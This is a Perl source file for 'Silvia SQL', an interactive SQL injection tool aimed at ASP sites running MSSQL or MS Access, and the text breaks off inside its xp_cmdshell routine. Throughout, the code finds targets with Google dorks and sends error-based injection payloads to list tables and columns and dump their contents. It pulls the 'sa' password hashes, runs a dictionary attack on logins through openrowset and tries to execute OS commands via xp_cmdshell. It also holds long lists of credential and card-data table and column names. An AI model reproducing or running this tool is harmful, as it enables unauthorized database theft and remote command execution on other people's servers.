#!/usr/bin/perl -w
#whereis perl
# Silvia sql version 1.0
# programmer: mywisdom the coder of solhack 2004
# especially dedicated to Silvia a girl that I love
# this tool is an sql injection tool for combination of asp and mssql; combination of asp and microsoft access database
# special thanks to our brotha: all jasakomers(om S'to,pirus,cybermutaqqin, p1t4qh,aurel666, bungaputrilacinta, mohammad,abhe(meong),ketek,dimasdz,agusdoubleb,assasdotcom,cr4wl3r,k3nz0, kiddies, achyx,etc..) greetz brotha
# special thanks to: darkc0de: baltazar,inkubus,kopele,rsauron,dehydra,trtxx,zerocode66
# special thanks to hmsecurity.org crews and members (upxilon,kill_tech,y0y0,etc...)
# and solhack (sons of liberty) crew 2004 (evidence@sdf.lonestar.org from croatia), getch@hol.gr the socket programmer from greece and foxx@feckov.org from holland
# and special thank to smj@sdf.lonestar.org (stephen jones), phm@sdf (peter h meadow), blakkat@sdf, paladin@sdf, gblack (biadabz), bl4ck3ng1n3,djarum_super,dewancc,mister saint etc...
# and h4cky0u & darkc0de crews
# send and comments to mywisdom@jasakom.org
# use this at your own risk, this program is for educational purpose
# licensed under gnu general public license
# [c] copyright 2008-2010 by jasakom.org all rights reserved
# Caution !!! Author takes no responsibility of and damage(s) of target(s)
# begin

#tempat data, variabel,array,dan public declare functions
use IO::Socket;  
use Socket;
use Net::hostent;
use LWP::Simple;
use LWP::UserAgent;
use HTTP::Request;
$ceker1="'";
$ceker2='+and+1=convert(int,@@version)#';
$ceker3="+and+1=convert(int,user_name())#";
$ceker4="+and+1=convert(int,db_name())#";
$ceker5="+and+1=convert(int,host_name())#";
$denzuko="http://";
$caritabel='+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables))#';
sub cleaner()
 {

$web_url=~ s/^\s+//;
$ceker1=~ s/^\s+//;
$ceker2=~ s/^\s+//;
$ceker3=~ s/^\s+//;
$ceker4=~ s/^\s+//;

 }

@fuzz_tables=("sysobjects","customers","tbladmins", "sort", "_wfspro_admin", "4images_users", "a_admin", "account", "accounts", "adm", "admin", "admin_login", "admin_user", "admin_userinfo", "administer", "administrable", "administrate", "administration", "administrator", "administrators", "adminrights", "admins", "adminuser", "art", "article_admin", "articles", "artikel", "\xc3\x83\xc3\x9c\xc3\x82\xc3\xab", "aut", "author", "autore", "backend", "backend_users", "backenduser", "bbs", "book", "chat_config", "chat_messages", "chat_users", "client", "clients", "clubconfig", "company", "config", "contact", "contacts", "content", "control", "cpg_config", "cpg132_users", "customer", "customers", "customers_basket", "dbadmins", "dealer", "dealers", "diary", "download", "Dragon_users", "e107.e107_user", "e107_user", "forum.ibf_members", "fusion_user_groups", "fusion_users", "group", "groups", "ibf_admin_sessions", "ibf_conf_settings", "ibf_members", "ibf_members_converge", "ibf_sessions", "icq", "images", "index", "info", "ipb.ibf_members", "ipb_sessions", "joomla_users", "jos_blastchatc_users", "jos_comprofiler_members", "jos_contact_details", "jos_joomblog_users", "jos_messages_cfg", "jos_moschat_users", "jos_users", "knews_lostpass", "korisnici", "kpro_adminlogs", "kpro_user", "links", "login", "login_admin", "login_admins", "login_user", "login_users", "logins", "logon", "logs", "lost_pass", "lost_passwords", "lostpass", "lostpasswords", "m_admin", "main", "mambo_session", "mambo_users", "manage", "manager", "mb_users", "member", "memberlist", "members", "minibbtable_users", "mitglieder", "movie", "movies", "ourbb_users", "oursql", "oursql.user", "name", "names", "news", "news_lostpass", "newsletter", "nuke_authors", "nuke_bbconfig", "nuke_config", "nuke_popsettings", "nuke_users", "\xc3\x93\xc3\x83\xc2\xbb\xc2\xa7", "obb_profiles", "order", "orders", "parol", "partner", "partners", "passes", "password", "passwords", "perdorues", "perdoruesit", "phorum_session", "phorum_user", "phorum_users", "phpads_clients", "phpads_config", "phpbb_users", "phpBB2.forum_users", "phpBB2.phpbb_users", "phpouradmin.pma_table_info", "pma_table_info", "poll_user", "punbb_users", "pwd", "pwds", "reg_user", "reg_users", "registered", "reguser", "regusers", "session", "sessions", "settings", "shop.cards", "shop.orders", "site_login", "site_logins", "sitelogin", "sitelogins", "sites", "smallnuke_members", "smf_members", "SS_orders", "statistics", "superuser", "sysadmin", "sysadmins", "system", "sysuser", "sysusers", "table", "tables", "tb_admin", "tb_administrator", "tb_login", "tb_member", "tb_members", "tb_user", "tb_username", "tb_usernames", "tb_users", "tbl", "tbl_user", "tbl_users", "tbluser", "tbl_clients", "tbl_client", "tblclients", "tblclient", "test", "usebb_members", "user", "user_admin", "user_info", "user_list", "user_login", "user_logins", "user_names", "usercontrol", "userinfo", "userlist", "userlogins", "username", "usernames", "userrights", "users", "vb_user", "vbulletin_session", "vbulletin_user", "voodoo_members", "webadmin", "webadmins", "webmaster", "webmasters", "webuser", "webusers", "x_admin", "xar_roles", "xoops_bannerclient", "xoops_users", "yabb_settings", "yabbse_settings", "ACT_INFO", "ActiveDataFeed", "Category", "CategoryGroup", "ChicksPass", "ClickTrack", "Country", "CountryCodes1", "CustomNav", "DataFeedPerformance1", "DataFeedPerformance2", "DataFeedPerformance2_incoming", "DataFeedShowtag1", "DataFeedShowtag2", "DataFeedShowtag2_incoming", "dtproperties", "Event", "Event_backup", "Event_Category", "EventRedirect", "Events_new", "Genre", "JamPass", "MyTicketek", "MyTicketekArchive", "News", "Passwords by usage count", "PerfPassword", "PerfPasswordAllSelected", "Promotion", "ProxyDataFeedPerformance", "ProxyDataFeedShowtag", "ProxyPriceInfo", "Region", "SearchOptions", "Series", "Sheldonshows", "StateList", "States", "SubCategory", "Subjects", "Survey", "SurveyAnswer", "SurveyAnswerOpen", "SurveyQuestion", "SurveyRespondent", "sysconstraints", "syssegments", "tblRestrictedPasswords", "tblRestrictedShows", "Ticket System Acc Numbers", "TimeDiff", "Titles", "ToPacmail1", "ToPacmail2", "Total Members", "UserPreferences", "uvw_Category", "uvw_Pref", "uvw_Preferences", "Venue", "venues", "VenuesNew", "X_3945", "stone list", "tblArtistCategory", "tblArtists", "tblConfigs", "tblLayouts", "tblLogBookAuthor", "tblLogBookEntry", "tblLogBookImages", "tblLogBookImport", "tblLogBookUser", "tblMails", "tblNewCategory", "tblNews", "tblOrders", "tblStoneCategory", "tblStones", "tblUser", "tblWishList", "VIEW1", "viewLogBookEntry", "viewStoneArtist", "vwListAllAvailable", "CC_info", "CC_username", "cms_user", "cms_users", "cms_admin", "cms_admins", "user_name", "jos_user", "table_user", "email", "mail", "bulletin", "cc_info", "login_name", "admuserinfo", "userlistuser_list", "SiteLogin", "Site_Login", "UserAdmin", "Admins", "Login", "Logins", "administrasi", "administrador", "adm", "yonetici");

@fuzz_columns=("user", "username", "password", "passwd", "pass", "cc_number", "id", "email", "emri", "fjalekalimi", "pwd", "user_name", "customers_email_address", "customers_password", "user_password", "name", "user_pass", "admin_user", "admin_password", "admin_pass", "usern", "user_n", "users", "login", "logins", "login_user", "login_admin", "login_username", "user_username", "user_login", "auid", "apwd", "adminid", "admin_id", "adminuser", "adminuserid", "admin_userid", "adminusername", "admin_username", "adminname", "admin_name", "usr", "usr_n", "usrname", "usr_name", "usrpass", "usr_pass", "usrnam", "nc", "uid", "userid", "user_id", "ourusername", "mail", "emni", "logohu", "punonjes", "kpro_user", "wp_users", "emniplote", "perdoruesi", "perdorimi", "punetoret", "logini", "llogaria", "fjalekalimin", "kodi", "emer", "ime", "korisnik", "korisnici", "user1", "administrator", "administrator_name", "mem_login", "login_password", "login_pass", "login_passwd", "login_pwd", "sifra", "lozinka", "psw", "pass1word", "pass_word", "passw", "pass_w", "user_passwd", "userpass", "userpassword", "userpwd", "user_pwd", "useradmin", "user_admin", "ourpassword", "passwrd", "admin_pwd", "admin_passwd", "mem_password", "memlogin", "e_mail", "usrn", "u_name", "uname", "mempassword", "mem_pass", "mem_passwd", "mem_pwd", "p_word", "pword", "p_assword", "ourname", "our_username", "our_name", "our_password", "our_email", "cvvnumber", "about", "access", "accnt", "accnts", "account", "accounts", "admin", "adminemail", "adminlogin", "adminmail", "admins", "aid", "aim", "auth", "authenticate", "authentication", "blog", "cc_expires", "cc_owner", "cc_type", "cfg", "cid", "clientname", "clientpassword", "clientusername", "conf", "config", "contact", "converge_pass_hash", "converge_pass_salt", "crack", "customer", "customers", "cvvnumber]", "data", "db_database_name", "db_hostname", "db_password", "db_username", "download", "e-mail", "emailaddress", "full", "gid", "group", "group_name", "hash", "hashsalt", "homepage", "icq", "icq_number", "id_group", "id_member", "images", "index", "ip_address", "last_ip", "last_login", "lastname", "log", "login_name", "login_pw", "loginkey", "loginout", "logo", "md5hash", "member", "member_id", "member_login_key", "member_name", "memberid", "membername", "members", "new", "news", "nick", "number", "nummer", "pass_hash", "passwordsalt", "passwort", "personal_key", "phone", "privacy", "pw", "pwrd", "salt", "search", "secretanswer", "secretquestion", "serial", "session_member_id", "session_member_login_key", "sesskey", "setting", "sid", "spacer", "status", "store", "store1", "store2", "store3", "store4", "table_prefix", "temp_pass", "temp_password", "temppass", "temppasword", "text", "un", "user_email", "user_icq", "user_ip", "user_level", "user_passw", "user_pw", "user_pword", "user_pwrd", "user_un", "user_uname", "user_usernm", "user_usernun", "user_usrnm", "userip", "userlogin", "usernm", "userpw", "usr2", "usrnm", "usrs", "warez", "xar_name", "xar_pass", "lozinka", "heslo", "adgangskode", "wachtwoord", "contrasena", "adm", "administrador", "yonetici");

sub halo()
{
print "\n**********************Silvia SQL version 1.0***************************\n";
print "\n             Programmer:mywisdom (mywisdom[at]jasakom.org)   \n";
print "\n                        SQLI Tool for MSSQL & MS Jet    \n";
print "\n                   Especially dedicated for Silvia     \n";
print "\n**********************Silvia SQL version 1.0***************************\n";
print "Option numbers / Steps:\n";
print "0. Search for sqli vulnerable site(s) from google based on a region(MSSQL and MS Jet only) \n";
print "1. Check url for vulnerable sql injection (MSSQL and MS Jet) \n";
print "2. Getting MSSQL Configuration (MSSQL only)\n";
print "3. Search for Table Name(s) in current Database (MSSQL only) \n";
print "4. Search for Column Name(s) in a table (MSSQL only)\n";
print "5. Dump a column (MSSQL only)\n";
print "6. Automatic Step by Step (Run Step 1 until step 4 automaticly (MSSQL only))\n";
print "7. List a User and password hash (MSSQL only)\n";
print "8. Try EXEC xp_cmdshell(MSSQL 2000 only)\n";
print "9. Searh Column length then try Fuzzing Table(s) and column(s)(MS Jet only)\n";
print "Type help for Help, type exit to stop this tool\n";
print "(just type: 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9)\n";
print "Type your option number:";
chomp( our $nomer = <STDIN> );
$logs= "\n**********************Silvia SQL version 1.0***************************\n";
$logs.= "\n             Programmer:mywisdom (mywisdom[at]jasakom.org)   \n";
$logs.= "\n                        SQLI Tool for MSSQL & MS Jet    \n";
$logs.= "\n                   Especially dedicated for Silvia     \n";
$logs.= "\n**********************Silvia SQL version 1.0***************************\n";
$logs.= "Option numbers / Steps:\n";
$logs.= "0. Search for sqli vulnerable site(s) from google based on a region (MSSQL and MS Jet only) \n";
$logs.= "1. Check url for vulnerable sql injection (MSSQL and MS Jet) \n";
$logs.= "2. Getting MSSQL Configuration (MSSQL only)\n";
$logs.= "3. Search for Table Name(s) in current Database (MSSQL only) \n";
$logs.= "4. Search for Column Name(s) in a table (MSSQL only)\n";
$logs.= "5. Dump a column (MSSQL only)\n";
$logs.= "6. Automatic Step by Step (Run Step 1 until step 4 automaticly (MSSQL only))\n";
$logs.= "7. List Users and password hashes,local dict attack(MSSQL only)\n";
$logs.= "8. Try EXEC xp_cmdshell (MSSQL  2000 only)\n";
$logs.= "9. Find Column length then try Fuzzing Table(s) and column(s)(MS Jet only)\n";
$logs.= "Type help for Help, type exit to stop this tool\n";
$logs.= "(just type: 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9)\n";
$logs.= "Type your option number:";
$logs.=$nomer;
tulis();
}
sub asu()
{
print "\n_________________________________________________________________\n";
print "Completed running your operation, result saved at silvialog.txt\n";
print "(If no result(s) showed here means there's no data or data can not be dump or your proxy doesnt work, you should check manually or use other working proxy)\n";
$logs= "\n_________________________________________________________________\n";
$logs.="Completed running your operation, result saved at silvialog.txt\n";
$logs.="(If no result(s) showed here means there's no data or data can not be dump or your proxy doesnt work, you should check manually or use other working proxy)\n";
tulis();

}
sub operasi()
{
 

   if($nomer=~"0")
         {
       modul0();
       asu();
        }
 

   if($nomer=~"1")
         {
       modul1();
       asu();
       
        }
  elsif($nomer=~"2")
        {
       modul2();
        asu();
      
        }
 elsif($nomer=~"3") 
       {
       modul3();
        asu();
       
       }
 elsif($nomer=~"4")
        {
        modul4();
      asu();
      

       }
  elsif($nomer=~"5")
        {
       modul5();
       asu();

        }
  elsif($nomer=~"6")
        {
       modul6();
       asu();

        }
 elsif($nomer=~"7")
        {
       modul7();
       asu();
      
        }
  elsif($nomer=~"8")
        {
       modul8();
       asu();
      
        }
  elsif($nomer=~"9")
        {
       modul9();
       asu();
      
         }
  
 elsif($nomer=~"help")
        {
        modul10();
       asu();
      
        }
elsif($nomer=~"menu")
        {
        utama();
        }

 else
        {
         die "\nSilvia SQLi Tool stopped, You can check your operations at silvialog.txt\n";
        }
 

}


sub tulis()
 {
open FILE, ">>silvialog.txt" or die $!;
print FILE $logs;
close FILE;
 }

sub getinfo()
{
print "\n[-] Gathering MSSQL configuration...please wait...\n";
$logs="\n[-] Gathering MSSQL configuration...please wait...\n";
tulis();
$verse="2005";
#versi&os
 cleaner();
$old=$web_url;
$web_url=$web_url.$ceker2;
print "[-]SQLI url:$web_url\n";
$logs="[-]SQLI url:$web_url\n";
tulis();
modus();
print "\n[+]Version Info:";
$logs="\n[+]Version Info:";
tulis();
teknik_parse();
$verse=$nilai;
$web_url=$old;


#current user
 cleaner();
$old=$web_url;
$web_url=$web_url.$ceker3;
modus();
print "\n[+]Current User:";
$logs="\n[+]Current User:";
tulis();
teknik_parse();
$web_url=$old;


#current db
 cleaner();
$old=$web_url;
$web_url=$web_url.$ceker4;
modus();
print "\n[+]Current Database:";
$logs="\n[+]Current Database:";
tulis();
teknik_parse();
$web_url=$old;

#hostname
 cleaner();
$old=$web_url;
$web_url=$web_url.$ceker5;
modus();
print "\n[+]Hostname:";
$logs="\n[+]Hostname:";
tulis();
teknik_parse();
$web_url=$old;


}

sub rearrange_this_web()
{
 if($web_url=~/http:/)
  {
  }
 else
  {
  $web_url=$denzuko.$web_url;
  }

}
sub rearrange_this_proxy()
{
 if($proxy_url=~/http:/)
  {
  }
 else
  {
  $proxy_url=$denzuko.$proxy_url;
  }

}

sub dump_kolom()
 {
 print "\nType a column name to dump:";
 $logs="\nType a column name to dump:";
tulis();
 chomp( our $kolom = <STDIN> );
$logs=$kolom;
tulis();
print "\n[-]Please wait...dumping column content\n";
print "\n[+]Content of column $kolom inside table $tabel:\n";
$logs="\n[-]Please wait...dumping column content\n";
tulis();
$logs="\n[+]Content of column $kolom inside table $tabel:\n";
tulis(); 
$i_love_you_Silvia="+and+1=convert(int,(select+top+1+$kolom+from+$tabel";
 $silvia="))--";
 $old=$web_url;
 $web_url=$web_url.$i_love_you_Silvia.$silvia;
 modus();
  teknik_parse();
 $web_url=$old;
@isi_kolom = ($nilai);
$tambahanx="+and+1=convert(int,(select+top+1+$kolom+from+$tabel+where+$kolom+not+in+(";
$eva=")))--"; 
while($content =~m/Conversion failed when converting/)
    {
    $old=$web_url;
    foreach (@isi_kolom)
          {
          $data.="'".$_."',";
          }
     $data=substr($data, 0, -1);
     $web_url=$web_url.$tambahanx.$data.$eva;
     modus();
     teknik_parse();
     unshift(@isi_kolom,$nilai);
     $web_url=$old;
    }

}

sub cari_kolom()
 {
 $kolsql="+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='$tabel'";
 $mywisdom_loves_silvia="))--";
 $old=$web_url;
 $web_url=$web_url.$kolsql.$mywisdom_loves_silvia;
 modus();
 print "\n[+]Column(s) inside table $tabel:\n";
$logs="\n[+]Column(s) inside table $tabel:\n";
tulis();
teknik_parse();


 $web_url=$old;

@nama_kolom = ($nilai);
$tambahanx="+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='$tabel'+and+column_name+not+in+(";
$eva=")))--";
 while($content =~m/Conversion failed when converting/)
    {
    $old=$web_url;
    foreach (@nama_kolom)
          {
          $data.="'".$_."',";
          }
    $data=substr($data, 0, -1);
    $web_url=$web_url.$tambahanx.$data.$eva;
     modus();
     teknik_parse();

     push(@nama_kolom,$nilai);
    $web_url=$old;
    }



 }
sub tanya_tabel()
 {
  if($carikolom=~"yes")
  {
 print "\nType table name to search for column(s):";
 chomp( our $tabel = <STDIN> );
$logs="\nType table name to search for column(s) name:$tabel";
tulis();
  }
 else
  {
  print "\nType table name to dump:";
  chomp( our $tabel = <STDIN> );
$logs="\nType table name to dump:";
tulis();
  }
}
sub teknik_parse()
{

$content=~ s/^\s+//;
@parsed = split(/'/, $content);
 @asshole=("tmp");
 $able="no";
$nextval="no";
foreach our $val (@parsed)
  {
    

     if($nextval =~ "yes")
      {
       our $nilai=$val;
         $nilai=~ s/^\s+//;
   

       if(grep $_ eq $nilai,@asshole)
        {

        }
        else
        {
       print "$nilai\n";
	   $able=$nilai;
       $logs=$nilai."\n";
       tulis();
       push(@asshole,$nilai);
        }
      } 

    if ($val =~ /Conversion failed when converting/ || $val =~ /error converting the nvarchar value /)
        {
          $nextval="yes";

        }
       else
        {
          $nextval="no";

        }
  
 }


}

sub modul0()
{
#this google search section was ripped and modified from inkubus@darkc0de script and cwh underground script
 print "\nThis tool will use google.com as default, you may choose other google based on country ";

 print "\nDo you want to google search based on country ? (y/n)";
 chomp( our $opsi = <STDIN> );
 if($opsi=~"yes" || $opsi=~"y" || $opsi=~"Y")
     {
   print "\nAvailable google url based on country, please choose:";
   print "\n1. www.google.com";
    print "\n2. www.google.co.uk (google uk)";
    print "\n3. www.google.co.id (google indonesia)";
	print "\n4. www.google.co.il (google israel)";
      print "\n5. www.google.co.in (google india)";
    print "\n6. www.google.co.jp (google japan)";
    print "\n7. www.google.cn (google china)";
   print "\n8. www.google.com.sg (google singapore)";
   print "\n9. www.google.com.my (google malaysia)";
    print "\n10. www.google.com.tr (google turkey)";
    print "\n11. www.google.com.pk (google pakistan)";
   print "\n12. www.google.co.il (google israel)";
   print "\n13. www.google.es (google spain)";
   print "\n14. www.google.com.au (google australia)";
   print "\n(just type the number :1 or 2 or 3 till 14)";
   print "\nType option number:";   
 chomp( our $num = <STDIN> );

   $logs="\nAvailable google url based on country, please choose:";
   $logs.= "\n1. www.google.com";
    $logs.= "\n2. www.google.co.uk (google uk)";
    $logs.= "\n3. www.google.co.id (google indonesia)";
	$logs.= "\n4. www.google.co.il (google israel)";
      $logs.= "\n5. www.google.co.in (google india)";
    $logs.= "\n6. www.google.co.jp (google japan)";
    $logs.= "\n7. www.google.cn (google china)";
   $logs.= "\n8. www.google.com.sg (google singapore)";
   $logs.= "\n9. www.google.com.my (google malaysia)";
    $logs.= "\n10. www.google.com.tr (google turkey)";
    $logs.= "\n11. www.google.com.pk (google pakistan)";
   $logs.= "\n12. www.google.co.il (google israel)";
   $logs.= "\n13. www.google.es (google spain)";
   $logs.= "\n14. www.google.com.au (google australia)";
   $logs.= "\n(just type the number :1 or 2 or 3 till 14)";
   $logs.= "\nType option number:";   
   $logs.=$num;
tulis();
      
     
 if($num =~ "1")
    {
	$country="http://www.google.com";
	$hl="en";
	$cr="";
	}
  elsif($num=~"2")
    {
 $country="http://www.google.co.uk";
 $hl="en";
 $cr="cr=countryUK|countryGB";
 
    }      
  elsif($num=~"3")
    {
 $country="http://www.google.co.id";
 $hl="id";
 $cr="cr=countryID";
 
 
    }  
  elsif($num=~"4")
    {
 $country="http://www.google.co.il";
 $hl="ar";
 $cr="cr=countryIL";
 
 
 
    }      
	elsif($num=~"5")
    {
 $country="http://www.google.co.in";
 $hl="hi";
 $cr="cr=countryIN";
 
 
 
    }      

      elsif($num=~"6")
    {
 $country="http://www.google.jp";
 $hl="ja";
 $cr="cr=countryJP";
    }      
	  elsif($num=~"7")
    {
 $country="http://www.google.cn";
 $hl="zh-CN";
 $cr="cr=countryCN";
 
 
 
    }      
  elsif($num=~"8")
    {
 $country="http://www.google.com.sg";
 $hl="en";
 $cr="cr=countrySG";
 
 
 
    }      
  elsif($num=~"9")
    {
 $country="http://www.google.com.my";
 $hl="en";
 $cr="cr=countryMY";
 
 
 
    }      
	  elsif($num=~"10")
    {
 $country="http://www.google.com.tr";
 $hl="tr";
 $cr="cr=countryTR";
    }      
	  elsif($num=~"11")
    {
 $country="http://www.google.com.pk";
 $hl="en";
 $cr="cr=countryPK";
    }      
	  elsif($num=~"12")
    {
 $country="http://www.google.co.il";
 $hl="iw";
 $cr="cr=countryIL";
    }      
  elsif($num=~"14")
    {
 $country="http://www.google.com.au";
 $hl="en";
 $cr="cr=countryAU";
    }      
	
  elsif($num=~"13")
    {
 $country="http://www.google.es";
 $hl="es";
 $cr="cr=countryES";
    }      
	
}


 print "\nInsert Google Dork:";
        chomp( our $keyword = <STDIN> );
        $logs="google dork:$keyword";
        tulis();
		print "Total Query Pages (10 Links/Pages) :";
  	chomp( our $page = <STDIN> );

        print "\n[+] Please wait ! Searching vulnerable mssql and ms jet injection target(s) from google  ...\n";
        print "\n-----------------------------------------------\n";
        $logs="\n[+] Please wait ! Searching vulnerable mssql and ms jet injection target(s) from google  ...\n";
        tulis();
        $logs="\n------------------------------------------------\n";
        tulis();

          
       for($start = 0;$start != $page*10;$start += 10)
        {       
if($opsi=~"yes" || $opsi=~"y" || $opsi=~"Y")
     {
  $google_url="$country/search?hl=$hl&q=".$keyword."&btnG=Search&start=".$start."&meta=".$cr;
    } 
else
    {
 $google_url="http://www.google.com/search?hl=en&q=".$keyword."&btnG=Search&start=".$start;
 
    }
print "\n--------Going to Next Page ----------------\n";
 print "\nYour google url:$google_url\n";
 print "\n--------Searching from next page,please wait----------------\n";
       $logs= "\n--------Going to Next Page ----------------\n";
 $logs.= "\nYour google url:$google_url\n";
 $logs.= "\n--------Searching from next page,please wait----------------\n";
tulis();  
          $ua = LWP::UserAgent->new(agent => 'Mozilla 5.2');
            $ua->timeout(10);
            $ua->env_proxy;
            $response = $ua->get($google_url);
            if ($response->is_success)
            {
                $c = $response->content;
                @stuff = split(/<a href=/,$c);
                foreach $line(@stuff)
                {
                    if($line =~/(.*) class=l/ig)
                    {
                        $out = $1;
                        $out =~ s/\"//g;
                        $out =~s/$/\'/;    
                        $ua = LWP::UserAgent->new(agent => 'Mozilla 5.2');
                        $ua->timeout(10);
                        $ua->env_proxy;
                        $response = $ua->get($out);
                        $error = $response->content();
                        if($error =~m/Microsoft JET Database/ || $error =~m/ODBC Microsoft Access Driver/)
                                {
                                 print "\n[+]$out => Could be Vulnerable in MS Access Injection!!\n";
                                 $logs="\n[+]$out => Could be Vulnerable in MS Access Injection!!\n";
                                 tulis();
                                 }
                        elsif($error =~m/Microsoft OLE DB Provider for SQL Server/ || $error =~m/Unclosed quotation mark/)
                                {
                                print "\n[+]$out => Could be Vulnerable in MSSQL Injection!!\n";
                                $logs="\n[+]$out => Could be Vulnerable in MSSQL Injection!!\n";
                                tulis();
                                 }
                      }
                }
            }
        }

# eof ripped section

}



sub modul1()
{
askproxsi();
}


sub modul2()
{
ulangproxsi();
getinfo();

}
sub modul3()
{
ulangproxsi();
getinfo();
print "\n---Searching Table(s) inside Database,please wait---\n";
$logs="\n-----------Searching Table(s) inside Database,please wait-----------------\n";
tulis();
cari_table();
}


sub cari_table()
 {
our $old=our $web_url;
our $tes=$web_url.$caritabel;
$web_url=$tes;
modus();
print "\n[+]Table(s) in current database:\n";
$logs="\n[+]Table(s) in current database:\n";
tulis();
teknik_parse();
$web_url=$old;
@nama_table = ($nilai);
$tambahan="+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+(";
$eva=")))--";
 while($content =~m/Conversion failed when converting/)
    {
    $old=$web_url;
    foreach (@nama_table)
          {
          $data.="'".$_."',";
          }
    $data=substr($data, 0, -1);
    $web_url=$web_url.$tambahan.$data.$eva;
     modus();
     teknik_parse();

     push(@nama_table,$nilai);
  
    $web_url=$old;
    }


 }
sub modul4()
{
ulangproxsi();
$carikolom="yes";
tanya_tabel();
cari_kolom();
}


sub modul5()
{
ulangproxsi();
$carikolom="no";
tanya_tabel();
dump_kolom();
}
sub modul6()
{
ulangproxsi();
modul2();
modul3();
modul4();
}
sub modul7()
{
ulangproxsi();
getinfo();
  if ($verse =~ /2005/)
        {
		print "\n[-] Checking whether we can get password hash on this mssql 2005 or not, please wait...if can,u may see encypted sa password:\n";
		$logs="\n[-] Checking whether we can get password hash on this mssql 2005 or not, please wait...if can,u may see encypted sa password:\n";
		tulis();
		$old=$web_url;
		$tambah="+and+1=convert(int,(select+top+1+master.sys.fn_varbintohexstr(password_hash)+from+master.sys.sql_logins+where+name='sa'))--";
        $web_url=$web_url.$tambah;
	    modus();
        teknik_parse();
        		  $web_url=$old;

		  if($nilai =~ /no/)
		   {
		   print "\nSorry we can not view password hash...you should check it manually\n";
		   $logs="\nSorry we can not view password hash...you should check it manually\n";
		   tulis();
		   }
		   else
		   {
		   print "\nW00t!!! You have seen encrypted password for user sa !!! \n";
		  $logs="\nW00t!!! You have seen encrypted password for user sa !!! \n";
		  tulis();
		   }

		
		}
        else
		{
				print "\n[-] Checking whether we can get password hash on this mssql 2000 or not, please wait...if can,u may see encrypted sa password:\n";
				$logs= "\n[-] Checking whether we can get password hash on this mssql 2000 or not, please wait...if can,u may see encrypted sa password:\n";
              tulis();
		$old=$web_url;
		$tambah="+and+1=convert(int,(select+top+1+master.dbo.fn_varbintohexstr(password)+from+master..sysxlogins+where+name='sa'))--";
         $web_url=$web_url.$tambah;
	      modus();
         teknik_parse();
		  $web_url=$old;

     if($able =~ /no/)
		   {
		   print "\nSorry we can not view password hash...you should check it manually\n";
		    $logs= "\nSorry we can not view password hash...you should check it manually\n";
		  tulis();
		   }
		   else
		   {
		   print "\nW00t!!! You have seen encypted password for user sa !!!\n";
		   
		   print "\nTry to dump a top password from table sysusers,please wait\n";
		   
		   $logs= "\nW00t!!! You have seen encypted password for user sa !!!\n";
		   
		   $logs.= "\nTry to dump a top password from table sysusers,please wait\n";
     tulis();
		   
       		 		$old=$web_url;
		$tambah="+and+1=convert(int,(select+top+1+master.dbo.fn_varbintohexstr(password)+from+master..sysusers))--";
         $web_url=$web_url.$tambah;
	      modus();
         teknik_parse();
		  $web_url=$old;
    print "\nTry to dump a top name from table sysusers,please wait\n";
	    $logs= "\nTry to dump a top name from table sysusers,please wait\n";
tulis();
       		 		$old=$web_url;
		$tambah="+and+1=convert(int,(select+top+1+name+from+master..sysusers))--";
         $web_url=$web_url.$tambah;
	      modus();
         teknik_parse();
		  $web_url=$old;
   
		   }

		}  

}

sub modul8()
{
ulangproxsi();
 $old=$web_url;
  print "\nEnter MSSQL Database to connect:";
        chomp( our $db = <STDIN> );

 print "\nEnter MSSQL Host to connect:";
        chomp( our $hostname = <STDIN> );
 
 print "\nEnter MSSQL User to connect:";
        chomp( our $user = <STDIN> );
 
  print "\nDo you know the password ?(y/n)";
       chomp( our $know = <STDIN> );
	   
	   
	   #tulis log
	   $logs= "\nEnter MSSQL Database to connect:";
        $logs.=$db;

 $logs.= "\nEnter MSSQL Host to connect:";
       $logs.=$hostname;
 
 $logs.= "\nEnter MSSQL User to connect:";
        $logs.=$user;
 
 $logs.="\nDo you know the password ?(y/n)";
      $logs.=$know;
	
	   #eof tulis log
	   
	   
	   if(($know=~/y/) || ($know=~/Y/) || ($know=~/yes/))
       {
	   print "\nEnter MSSQL password:";
	   chomp( our $password = <STDIN> );
  $logs= "\nEnter MSSQL password:";
	   $logs.=$password;
tulis();
	
	   }
	   else
	   {
	   #dict attack
	   $hasil="none";
	   open (FILE, "password1.txt") || die "Can't open password1.txt: $!\n";
         while (<FILE>) 
         { 
          $password=$_;
          print "\n[+]Testing for connexion using password:".$password;
		     $logs= "\n[+]Testing for connexion using password:".$password;
		tulis();
		   $tambahan=" union select * from openrowset('SQLoledb','server=$hostname;uid=$user;pwd=$password','select * from master..sysusers')--";
          $web_url=$web_url.$tambahan;
          modus();
        if(($content=~/blocked access to STATEMENT/) || ($content=~/access denied/) || ($content=~/Login failed/) || ($content=~/Incorrect syntax/))
                {
				  print "\nLogin failed using password:$password";
				}
				else
				{
				print "\n----------------------------------------------";
				print "\n[+]Woot no error message found using this password !!! possible login succeed !!!";
				$logs= "\n----------------------------------------------";
				$logs.="\n[+]Woot no error message found using this password !!! possible login succeed !!!";
				tulis();
				}

          }
        close(FILE);
	   #eof dict attack
	   
	   }
	    print "\nEnter sql command to execute:";
        chomp( our $sql = <STDIN> );
   print "\nEnter ms dos command to execute:";
        chomp( our $cmd = <STDIN> );

 $logs= "\nEnter sql command to execute:";
        $logs.=$sql;
  $logs.= "\nEnter ms dos command to execute:";
        $logs.=$cmd;
tulis();


 $tambahan=" union select * from openrowset('SQLoledb','server=$hostname;uid=$user;pwd=$password','$sql')--";
 $web_url=$web_url.$tambahan;
 modus();
 if(($content=~/blocked access to STATEMENT/) || ($content=~/access denied/) || ($content=~/Login failed/) || ($content=~/Incorrect syntax/))
 {
  print "\nSorry failed to execute your sql command on target !!!\n";
 $logs= "\nSorry failed to execute your sql command on target !!!\n";
tulis();
 }
 else
 {
   print "\nServer doesnt respond with error message, maybe your sql command has been executed !!!\n";
  $logs= "\nServer doesnt respond with error message, maybe your sql command has been executed !!!\n";
tulis();
 }
 $web_url=$old;
 print "\nTrying to exec your ms dos command on target\n";
  $logs= "\nTrying to exec your ms dos command on target\n";
tulis();
 $tambahan="; EXEC opendatasource('SQLoledb','Persist Securit Info=False;DataSource=$db;UserID=$user;Password=$password').master.dbo.xp_cmdshell '$cmd';";
 $web_url=$web_url.$tambahan;
 modus();
 
 
